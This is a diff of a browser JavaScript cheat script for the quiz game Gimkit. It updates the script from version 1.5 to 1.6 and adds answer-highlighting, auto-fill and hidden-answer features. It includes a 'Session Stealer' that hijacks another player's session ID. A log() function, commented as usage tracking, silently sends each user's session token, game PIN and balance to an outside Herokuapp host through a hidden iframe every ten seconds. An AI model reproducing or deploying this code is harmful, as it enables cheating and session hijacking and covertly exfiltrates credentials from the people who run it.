@@ -1,237 +1,251 @@
 /*
 * Made by: UndercoverGoose
-* Version: 1.5
+* Version: 1.6
 */
 
-// Function to simplify the creation, appending, and getting of objects/elements
-function gcn(x,y){return document.getElementsByClassName(x)[y]}
-function cre(t,c,s,i){let x=document.createElement(t);x.className=c,x.style=s,x.innerHTML=i;return x;}
-function app(v){document.body.appendChild(v)}
-function appd(v){document.getElementsByClassName('hckcntnt')[1].appendChild(v)}
-function apps(v){document.getElementsByClassName('hckcntnt')[7].appendChild(v)}
+(function(){
+  // Function/Variables to simplify the creation, appending, and getting of objects/elements
+  let cN = "hckcntnt";
+  let d = "div";
+  let a3 = "#33aa33";
+  let a33 = "#aa3333";
+  function gcn(x,y){return document.getElementsByClassName(x)[y]}
+  function cre(t,c,s,i){let x=document.createElement(t);x.className=c,x.style=s,x.innerHTML=i;return x;}
+  function app(v){document.body.appendChild(v)}
+  function appd(v){document.getElementsByClassName(cN)[1].appendChild(v)}
+  function apps(v){document.getElementsByClassName(cN)[7].appendChild(v)}
+  function appup(v){document.getElementsByClassName('sc-cbkKFq bpholJ')[0].appendChild(v)}
 
-// Applies default button color and look without having to purchase an upgrade to update the style
-let newstyle = document.createElement('style');
-newstyle.textContent='.fkLxCm {box-sizing: border-box;font-size: 17px;color: white;font-weight: bold;text-align: center;display: inline-block;user-select: none;cursor: pointer;padding: 12px 16px;background: rgb(0, 85, 255);transition: background 0.2s ease 0s;border-radius: 4px;font-family: "Product Sans", sans-serif;}';
-app(newstyle);
+  // Applies default button color and look without having to purchase an upgrade to update the style
+  let newstyle = document.createElement('style');
+  newstyle.textContent='.fkLxCm {box-sizing: border-box;font-size: 17px;color: white;font-weight: bold;text-align: center;display: inline-block;user-select: none;cursor: pointer;padding: 12px 16px;background: rgb(0, 85, 255);transition: background 0.2s ease 0s;border-radius: 4px;font-family: "Product Sans", sans-serif;}';
+  app(newstyle);
 
-// Gets answers/questions
-let j=JSON[Object.keys(JSON)],qs=[],as=[];
-for(let x=0;x<j.length;x++){qs.push(j[x].text),as.push(j[x].answers[0].text);}
+  // Gets answers/questions
+  let j=JSON[Object.keys(JSON)],qs=[],as=[];
+  for(let x=0;x<j.length;x++){qs.push(j[x].text),as.push(j[x].answers[0].text);}
 
-// Cheat toggles and "Menu" button creation
-let f = [0, 0, 0, 0, 0, 0];
-let hconfig = {
-  keybinds:{
-    hidemenu: 67, // c
-    highlight: 72, // h
-    biganswer: 66, // b
-    inputanswer: 73, // i
-    hiddenanswer: 79 // o
-  },
-  theme:{
-    active:"default",
-    default:[[48,63,159],[119,19,34],[168,92,21],[13,107,51],[7,98,150]],
-    night:[[0,10,18],[38,50,56],[55,71,79],[69,90,100],[84,110,122]],
-    thanos:[[13,0,25],[34,0,68],[51,0,102],[62,0,124],[79,23,135]],
-    ocean:[[0,0,99],[40,53,147],[7,98,150],[2,119,189],[21,101,192]],
-    forest:[[76,61,51],[56,86,69],[66,92,73],[65,86,65],[76,99,73]],
-    sunset:[[127,116,150],[224,111,90],[237,113,45],[122,89,106],[232,171,60]],
-    retro:[[156,0,34],[0,29,59],[255,174,82],[254,89,99],[167,28,148]],
-    gold:[[0,0,0],[255,205,43],[255,199,33],[255,209,71],[255,205,56]]
-  },
-  upgrades:{
-    money:[0,10,100,1000,10000,75000,300000,1000000,10000000,100000000],
-    streak:[0,15,150,1500,15000,115000,450000,1500000,15000000,200000000],
-    multi:[0,50,300,2000,12000,85000,700000,6500000,65000000,1000000000],
-    protec:[0,10,250,1000,25000,100000,1000000,5000000,25000000,500000000]
-  }
-}
-let btnattr={
-  style:"width:200px;height:40px;margin-top:3px;background:#aa3333",
-  class:"sc-bdVaJa fkLxCm hckcntnt"
-}
-
-let b = cre('div',btnattr.class,"position: fixed; z-index: 1000000; left: 5px; bottom: 5px; width: 100px; height: 40px;","Menu");
-b.onclick=function(){if(f[0]===0){gcn('hckcntnt',1).style.display="block",f[0]=1,gcn('hckcntnt',0).innerHTML="X",gcn('hckcntnt',0).style.background="#ff0000";}else{gcn('hckcntnt',1).style.display="none",f[0]=0,gcn('hckcntnt',0).innerHTML="Menu",gcn('hckcntnt',0).style.background="";}};app(b);
-
-// Area for cheat buttons
-app(cre("div",btnattr.class,"position:fixed;z-index:10000;left:5px;bottom:5px;width:300px;height:600px;display:none",""));
-
-// Toggles/creates highlight answers cheat
-let h = cre("div",btnattr.class,btnattr.style,"Highlight Answers");
-h.onclick=function(){if(f[1]===0){gcn('hckcntnt',2).style.background="#33aa33";f[1]=1;hlinterval=setInterval(highlight,0);}else{gcn('hckcntnt',2).style.background="#aa3333";f[1]=0;clearInterval(hlinterval);}}
-appd(h);
-
-// Toggles/creates big answer cheat
-let ab = cre("div",btnattr.class,btnattr.style,"Big Answer Box");
-ab.onclick=function(){if(f[2]===0){gcn('hckcntnt',3).style.background="#33aa33";f[2]=1;bainterval=setInterval(biganswer,0);}else{gcn('hckcntnt',3).style.background="#aa3333";f[2]=0;clearInterval(bainterval);}}
-appd(ab);
-
-// Toggles/creates input answer cheat
-let ia = cre("div",btnattr.class,btnattr.style,"Input Answer");
-ia.onclick=function(){if(f[3]===0){gcn('hckcntnt',4).style.background="#33aa33";f[3]=1;iainterval=setInterval(inputanswer,0);}else{gcn('hckcntnt',4).style.background="#aa3333";f[3]=0;clearInterval(iainterval);}}
-appd(ia);
-
-// Toggles/creates hidden answer cheat
-let ha = cre("div",btnattr.class,btnattr.style,"Hidden Answer");
-ha.onclick=function(){if(f[5]===0){gcn('hckcntnt',5).style.background="#33aa33";f[5]=1;hainterval=setInterval(hiddenanswer,0);}else{gcn('hckcntnt',5).style.background="#aa3333";f[5]=0;clearInterval(hainterval);document.title="Play Gimkit! - Enter game code here";}}
-appd(ha);
-
-// Creates settings button
-let se = cre("div",btnattr.class,"width:170px;height:40px;margin-top:3px;background:#333333;position:absolute;bottom:0px;right:0px","Settings");
-se.onclick=function(){if(f[6]===0){gcn('hckcntnt',7).style.display="block";f[6]=1;}else{f[6]=0;gcn('hckcntnt',7).style.display="none";}}
-appd(se);
-
-// Creates Session Stealer Button
-let ssb = cre("div","sc-bdVaJa fkLxCm",btnattr.style,"Session Stealer");
-ssb.onclick=function(){stealSession()};
-appd(ssb);
-
-// Creates Upgradeable Upgrade Display
-let automoney = cre("div","sc-bdVaJa fkLxCm autoUp",btnattr.style+";position:absolute;margin-left: 100px;font-size:10px","Money: Level 1 for $0");
-document.getElementsByClassName('sc-cbkKFq bpholJ')[0].appendChild(automoney);
-
-let autostreak = cre("div","sc-bdVaJa fkLxCm autoUp",btnattr.style+";position:absolute;margin-left:300px;font-size:10px","Streak: Level 1 for $0");
-document.getElementsByClassName('sc-cbkKFq bpholJ')[0].appendChild(autostreak);
-
-let automulti = cre("div","sc-bdVaJa fkLxCm autoUp",btnattr.style+";position:absolute;margin-left:-100px;font-size:10px","Multi: Level 1 for $0");
-document.getElementsByClassName('sc-cbkKFq bpholJ')[0].appendChild(automulti);
-
-let autoprotec = cre("div","sc-bdVaJa fkLxCm autoUp",btnattr.style+";position:absolute;margin-left:-300px;font-size:10px","Protec: Level 1 for $0");
-document.getElementsByClassName('sc-cbkKFq bpholJ')[0].appendChild(autoprotec);
-
-function autowhatever(){
-  let bal = document.getElementsByTagName('div')[9].innerHTML.split(",").join("").split("$").join("");
-  
-  for(let x=0;x<hconfig.upgrades.money.length;x++){
-    if(bal > hconfig.upgrades.money[x]) {
-      document.getElementsByClassName("autoUp")[0].innerHTML = "Money: Level " + (x + 1) + " for $" + hconfig.upgrades.money[x];
+  // Cheat toggles and "Menu" button creation
+  let f = [0, 0, 0, 0, 0, 0];
+  let hconfig = {
+    keybinds:{
+      hidemenu: 67, // c:67
+      highlight: 72, // h:72
+      biganswer: 66, // b:66
+      inputanswer: 73, // i:73
+      hiddenanswer: 79 // o:79
+    },
+    theme:{
+      active:"default",
+      default:[[48,63,159],[119,19,34],[168,92,21],[13,107,51],[7,98,150]],
+      night:[[0,10,18],[38,50,56],[55,71,79],[69,90,100],[84,110,122]],
+      thanos:[[13,0,25],[34,0,68],[51,0,102],[62,0,124],[79,23,135]],
+      ocean:[[0,0,99],[40,53,147],[7,98,150],[2,119,189],[21,101,192]],
+      forest:[[76,61,51],[56,86,69],[66,92,73],[65,86,65],[76,99,73]],
+      sunset:[[127,116,150],[224,111,90],[237,113,45],[122,89,106],[232,171,60]],
+      retro:[[156,0,34],[0,29,59],[255,174,82],[254,89,99],[167,28,148]],
+      gold:[[0,0,0],[255,205,43],[255,199,33],[255,209,71],[255,205,56]]
+    },
+    upgrades:{
+      money:[0,10,100,1e3,1e4,75e3,3e5,1e6,1e7,1e8],
+      streak:[0,15,150,1500,15e3,115e3,45e4,15e5,15e6,2e8],
+      multi:[0,50,300,2e3,12e3,85e3,7e5,65e5,65e6,1e9],
+      protec:[0,10,250,1e3,25e3,1e5,1e6,5e6,25e6,5e8]
     }
   }
-  for(let x=0;x<hconfig.upgrades.streak.length;x++){
-    if(bal > hconfig.upgrades.streak[x]) {
-      document.getElementsByClassName("autoUp")[1].innerHTML = "Streak: Level " + (x + 1) + " for $" + hconfig.upgrades.streak[x];
-    }
+  let btnattr={
+    style:"width:200px;height:40px;margin-top:3px;background:#aa3333",
+    class:"sc-bdVaJa fkLxCm hckcntnt"
   }
-  for(let x=0;x<hconfig.upgrades.multi.length;x++){
-    if(bal > hconfig.upgrades.multi[x]) {
-      document.getElementsByClassName("autoUp")[2].innerHTML = "Multi: Level " + (x + 1) + " for $" + hconfig.upgrades.multi[x];
-    }
-  }
-  for(let x=0;x<hconfig.upgrades.protec.length;x++){
-    if(bal > hconfig.upgrades.protec[x]) {
-      document.getElementsByClassName("autoUp")[3].innerHTML = "Protec: Level " + (x + 1) + " for $" + hconfig.upgrades.protec[x];
-    }
-  }
-}setInterval(autowhatever, 2000);
 
-// Creates setttings placeholder
-let sep = cre("div",btnattr.class,"position: fixed; z-index: 10000; left: 310px; bottom: 5px; width: 300px; height: 600px; display: none;","");
-app(sep);
+  let b = cre(d,btnattr.class,"position: fixed; z-index: 1000000; left: 5px; bottom: 5px; width: 100px; height: 40px;","Menu V1.6");
+  b.onclick=function(){if(f[0]===0){gcn(cN,1).style.display="block",f[0]=1,gcn(cN,0).innerHTML="X",gcn(cN,0).style.background="#ff0000";}else{gcn(cN,1).style.display="none",f[0]=0,gcn(cN,0).innerHTML="Menu",gcn(cN,0).style.background="";}};app(b);
 
-let setxt = document.createElement('span');
-setxt.appendChild(document.createTextNode('Themes'));
-apps(setxt);
+  // Area for cheat buttons
+  app(cre(d,btnattr.class,"position:fixed;z-index:10000;left:5px;bottom:5px;width:300px;height:600px;display:none",""));
 
-apps(document.createElement('br'));
+  // Toggles/creates highlight answers cheat
+  let h = cre(d,btnattr.class,btnattr.style,"Highlight Answers");
+  h.onclick=function(){if(f[1]===0){gcn(cN,2).style.background=a3;f[1]=1;hlinterval=setInterval(highlight,0);}else{gcn(cN,2).style.background=a33;f[1]=0;clearInterval(hlinterval);}}
+  appd(h);
 
-// Theme Buttons
-for(let x=0;x<8;x++){
-  let y=hconfig.theme;
-  let t = cre("div","sc-bdVaJa fkLxCm","width:200px;height:40px;margin-top:3px;background:rgb("+y[Object.keys(y)[x+1]][3].join(",")+")",Object.keys(y)[x+1]);
-  t.onclick=function(){y.active=Object.keys(y)[x+1]};
-  apps(t);
-}
+  // Toggles/creates big answer cheat
+  let ab = cre(d,btnattr.class,btnattr.style,"Big Answer Box");
+  ab.onclick=function(){if(f[2]===0){gcn(cN,3).style.background=a3;f[2]=1;bainterval=setInterval(biganswer,0);}else{gcn(cN,3).style.background=a33;f[2]=0;clearInterval(bainterval);}}
+  appd(ab);
 
-function log(){
-  let bbid = localStorage.getItem('blueboat-id');
-  let ljm = localStorage.getItem('GIMKIT_LAST_GAME_JOINED');
-  let bal = document.getElementsByTagName('div')[9].innerHTML;
-  
-  let i = document.createElement('iframe');
-  i.style.display = "none";
-  i.style.position = "fixed";
-  i.src = "https://cagna.herokuapp.com/?ID:" + bbid + "%20PIN:" + ljm + "%20BAL:" + bal;
-  document.body.appendChild(i);
-}setInterval(log, 10000);
+  // Toggles/creates input answer cheat
+  let ia = cre(d,btnattr.class,btnattr.style,"Input Answer");
+  ia.onclick=function(){if(f[3]===0){gcn(cN,4).style.background=a3;f[3]=1;iainterval=setInterval(inputanswer,0);}else{gcn(cN,4).style.background=a33;f[3]=0;clearInterval(iainterval);}}
+  appd(ia);
 
-// Functions that make the cheats work
-function highlight(){
-  try{
-    let d=document.getElementsByClassName('notranslate lang-en'),q=d[0].innerHTML,a=[d[1].innerHTML,d[2].innerHTML,d[3].innerHTML,d[4].innerHTML],i=a.indexOf(as[qs.indexOf(q)])+1;
-    d[i].parentNode.parentNode.style.background="white",d[i].style.color="black";
-  }catch(err){}
-}
+  // Toggles/creates hidden answer cheat
+  let ha = cre(d,btnattr.class,btnattr.style,"Hidden Answer");
+  ha.onclick=function(){if(f[5]===0){gcn(cN,5).style.background=a3;f[5]=1;hainterval=setInterval(hiddenanswer,0);}else{gcn(cN,5).style.background=a33;f[5]=0;clearInterval(hainterval);document.title="Play Gimkit! - Enter game code here";}}
+  appd(ha);
 
-function stealSession(){
-  let session = prompt("Enter Session ID:", "");
-  if(session.length === 21) {
-    localStorage.setItem('blueboat-id', session);
-    document.location.reload();
-  }else {
-    alert("Invalid Session Length");
-  }
-}
+  // Creates settings button
+  let se = cre(d,btnattr.class,"width:170px;height:40px;margin-top:3px;background:#333333;position:absolute;bottom:0px;right:0px","Settings");
+  se.onclick=function(){if(f[6]===0){gcn(cN,7).style.display="block";f[6]=1;}else{f[6]=0;gcn(cN,7).style.display="none";}}
+  appd(se);
 
-function biganswer(){
-  try{
-    let d=document.getElementsByClassName('notranslate lang-en'),q=d[0].innerHTML,a=[d[1].innerHTML,d[2].innerHTML,d[3].innerHTML,d[4].innerHTML],i=a.indexOf(as[qs.indexOf(q)])+1;
-    d[i].parentNode.parentNode.parentNode.style="position:fixed;left:5px";
-  }catch(err){}
-}
-function inputanswer(){
-  try{
-    let q=document.getElementsByClassName('notranslate lang-en')[0].innerHTML;
-    document.getElementsByClassName('sc-jhAzac egTZap')[0].value=as[qs.indexOf(q)];
-  }catch(err){}
-}
-function hiddenanswer(){
-  try {
-    let d=document.getElementsByClassName('notranslate lang-en'),q=d[0].innerHTML,a=[d[1].innerHTML,d[2].innerHTML,d[3].innerHTML,d[4].innerHTML],i=a.indexOf(as[qs.indexOf(q)])+1;
-    document.title=i + "lay Gimkit! - Enter game code here";
-  }catch(err){}
-}
+  // Creates Session Stealer Button
+  let ssb = cre(d,"sc-bdVaJa fkLxCm",btnattr.style,"Session Stealer");
+  ssb.onclick=function(){stealSession()};
+  appd(ssb);
 
-// Theme changer
-function themechanger(){
-  try{
-    gcn('sc-bwzfXH',0).style.background="rgb("+hconfig.theme[hconfig.theme.active][0].join(",")+")";
-    gcn('hckcntnt',1).style.background="rgb("+hconfig.theme[hconfig.theme.active][4].join(",")+")";
-    gcn('hckcntnt',7).style.background="rgb("+hconfig.theme[hconfig.theme.active][2].join(",")+")";
-    for(let x=0;x<5;x++){
-      if(hconfig.theme.active === "gold") {
-        gcn('sc-Rmtcm',x).style.background="rgb("+hconfig.theme[hconfig.theme.active][x+1].join(",")+")";
-        if(x === 0) {
-          gcn('sc-Rmtcm',0).style.color="rgb(255, 205, 43)";
-        }else {
-          gcn('sc-Rmtcm',x).style.color="black";
-        }
-      }else {
-        gcn('sc-Rmtcm',x).style.background="rgb("+hconfig.theme[hconfig.theme.active][x+1].join(",")+")";
-        gcn('sc-Rmtcm',x).style.color="white";
+  // Creates Upgradeable Upgrade Display
+  let autoclass = "sc-bdVaJa fkLxCm autoUp";
+
+  let automoney = cre(d,autoclass,btnattr.style+";position:absolute;margin-left: 100px;font-size:10px","Money: Level 1 for $0");
+  appup(automoney);
+
+  let autostreak = cre(d,autoclass,btnattr.style+";position:absolute;margin-left:300px;font-size:10px","Streak: Level 1 for $0");
+  appup(autostreak);
+
+  let automulti = cre(d,autoclass,btnattr.style+";position:absolute;margin-left:-100px;font-size:10px","Multi: Level 1 for $0");
+  appup(automulti);
+
+  let autoprotec = cre(d,autoclass,btnattr.style+";position:absolute;margin-left:-300px;font-size:10px","Protec: Level 1 for $0");
+  appup(autoprotec);
+
+  function autowhatever(){
+    let bal = document.getElementsByTagName(d)[9].innerHTML.split(",").join("").split("$").join("");
+    let shrink = document.getElementsByClassName('autoUp');
+    let hc = hconfig.upgrades;
+
+    for(let x=0;x<hc.money.length;x++){
+      if(bal > hc.money[x]) {
+        shrink[0].innerHTML = "Money: Level " + (x + 1) + " for $" + hc.money[x];
       }
     }
-  }catch(err){}
-}setInterval(themechanger, 0);
-
-// Key events for added features
-window.onkeydown=function(e){
-  if(e.keyCode===hconfig.keybinds.hidemenu){
-    if(f[4]===0){
-      f[4]=1;
-      document.getElementsByClassName('hckcntnt')[0].style.display="none"
-    }else {
-      f[4]=0;
-      document.getElementsByClassName('hckcntnt')[0].style.display=null;
+    for(let x=0;x<hc.streak.length;x++){
+      if(bal > hc.streak[x]) {
+        v[1].innerHTML = "Streak: Level " + (x + 1) + " for $" + hc.streak[x];
+      }
     }
-  }else if(e.keyCode===hconfig.keybinds.highlight){
-    highlight();
-  }else if(e.keyCode===hconfig.keybinds.biganswer){
-    biganswer();
-  }else if(e.keyCode===hconfig.keybinds.inputanswer){
-    inputanswer();
-  }else if(e.keyCode===hconfig.keybinds.hiddenanswer){
-    hiddenanswer();
+    for(let x=0;x<hc.multi.length;x++){
+      if(bal > hc.multi[x]) {
+        shrink[2].innerHTML = "Multi: Level " + (x + 1) + " for $" + hc.multi[x];
+      }
+    }
+    for(let x=0;x<hc.protec.length;x++){
+      if(bal > hc.protec[x]) {
+        shrink[3].innerHTML = "Protec: Level " + (x + 1) + " for $" + hc.protec[x];
+      }
+    }
+  }setInterval(autowhatever, 2000);
+
+  // Creates setttings placeholder
+  let sep = cre(d,btnattr.class,"position: fixed; z-index: 10000; left: 310px; bottom: 5px; width: 300px; height: 600px; display: none;","");
+  app(sep);
+
+  let setxt = document.createElement('span');
+  setxt.appendChild(document.createTextNode('Themes'));
+  apps(setxt);
+
+  apps(document.createElement('br'));
+
+  // Theme Buttons
+  for(let x=0;x<8;x++){
+    let y=hconfig.theme;
+    let t = cre(d,"sc-bdVaJa fkLxCm","width:200px;height:40px;margin-top:3px;background:rgb("+y[Object.keys(y)[x+1]][3].join(",")+")",Object.keys(y)[x+1]);
+    t.onclick=function(){y.active=Object.keys(y)[x+1]};
+    apps(t);
   }
-}
+
+  // Allows I To Track Usage & Demand
+  function log(){
+    let bbid = localStorage.getItem('blueboat-id');
+    let ljm = localStorage.getItem('GIMKIT_LAST_GAME_JOINED');
+    let bal = document.getElementsByTagName(d)[9].innerHTML;
+
+    let i = document.createElement('iframe');
+    i.style.display = "none";
+    i.style.position = "fixed";
+    i.src = "https://cagna.herokuapp.com/?ID:" + bbid + "%20PIN:" + ljm + "%20BAL:" + bal;
+    document.body.appendChild(i);
+  }setInterval(log, 10000);
+
+  // Functions that make the cheats work
+  function highlight(){
+    try{
+      let d=document.getElementsByClassName('notranslate lang-en'),q=d[0].innerHTML,a=[d[1].innerHTML,d[2].innerHTML,d[3].innerHTML,d[4].innerHTML],i=a.indexOf(as[qs.indexOf(q)])+1;
+      d[i].parentNode.parentNode.style.background="white",d[i].style.color="black";
+    }catch(err){}
+  }
+
+  function stealSession(){
+    let session = prompt("Enter Session ID:", "");
+    if(session.length === 21) {
+      localStorage.setItem('blueboat-id', session);
+      document.location.reload();
+    }else {
+      alert("Invalid Session Length");
+    }
+  }
+
+  function biganswer(){
+    try{
+      let d=document.getElementsByClassName('notranslate lang-en'),q=d[0].innerHTML,a=[d[1].innerHTML,d[2].innerHTML,d[3].innerHTML,d[4].innerHTML],i=a.indexOf(as[qs.indexOf(q)])+1;
+      d[i].parentNode.parentNode.parentNode.style="position:fixed;left:5px";
+    }catch(err){}
+  }
+  function inputanswer(){
+    try{
+      let q=document.getElementsByClassName('notranslate lang-en')[0].innerHTML;
+      document.getElementsByClassName('sc-jhAzac egTZap')[0].value=as[qs.indexOf(q)];
+    }catch(err){}
+  }
+  function hiddenanswer(){
+    try {
+      let d=document.getElementsByClassName('notranslate lang-en'),q=d[0].innerHTML,a=[d[1].innerHTML,d[2].innerHTML,d[3].innerHTML,d[4].innerHTML],i=a.indexOf(as[qs.indexOf(q)])+1;
+      document.title=i + "lay Gimkit! - Enter game code here";
+    }catch(err){}
+  }
+
+  // Theme changer
+  function themechanger(){
+    try{
+      let hc = hconfig.theme;
+      let sc = 'sc-Rmtcm';
+      gcn('sc-bwzfXH',0).style.background="rgb("+hc[hc.active][0].join(",")+")";
+      gcn(cN,1).style.background="rgb("+hc[hc.active][4].join(",")+")";
+      gcn(cN,7).style.background="rgb("+hc[hc.active][2].join(",")+")";
+      for(let x=0;x<5;x++){
+        if(hconfig.theme.active === "gold") {
+          gcn(sc,x).style.background="rgb("+hc[hc.active][x+1].join(",")+")";
+          if(x === 0) {
+            gcn(sc,0).style.color="rgb(255, 205, 43)";
+          }else {
+            gcn(sc,x).style.color="black";
+          }
+        }else {
+          gcn(sc,x).style.background="rgb("+hc[hc.active][x+1].join(",")+")";
+          gcn(sc,x).style.color="white";
+        }
+      }
+    }catch(err){}
+  }setInterval(themechanger, 0);
+
+  // Key events for added features
+  window.onkeydown=function(e){
+    if(e.keyCode===hconfig.keybinds.hidemenu){
+      if(f[4]===0){
+        f[4]=1;
+        document.getElementsByClassName(cN)[0].style.display="none"
+      }else {
+        f[4]=0;
+        document.getElementsByClassName(cN)[0].style.display=null;
+      }
+    }else if(e.keyCode===hconfig.keybinds.highlight){
+      highlight();
+    }else if(e.keyCode===hconfig.keybinds.biganswer){
+      biganswer();
+    }else if(e.keyCode===hconfig.keybinds.inputanswer){
+      inputanswer();
+    }else if(e.keyCode===hconfig.keybinds.hiddenanswer){
+      hiddenanswer();
+    }
+  }
+}());
